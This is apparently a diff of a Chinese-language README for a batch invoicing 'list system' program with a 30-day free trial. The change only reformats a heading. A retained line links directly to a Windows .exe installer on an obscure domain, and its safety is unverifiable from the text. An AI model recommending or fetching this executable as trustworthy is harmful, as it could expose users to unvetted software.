@@ -1,5 +1,5 @@
 ﻿# 清单系统软件（30天免费使用）
-## <table><tr><td bgcolor=PowderBlue>本软件适应于批量开票，开票品类再多都可以批量导入到财务开票软件中</td></tr></table>
+## 本软件适应于批量开票，开票品类再多都可以批量导入到财务开票软件中！
 ### 使用方法：
 
 >> +  **请点击此处**：[下载安装程序](https://0.553xyz.xyz/api/v3/file/source/640/%E6%99%BA%E8%83%BD%E5%BC%80%E7%A5%A8%E4%B8%8E%E6%B8%85%E5%8D%95%E7%B3%BB%E7%BB%9FV1.0.exe?sign=IgDMW4T5jIeTBaakI9jXkf7bTRAuFOSsB44N25lfZeI%3D%3A0)     
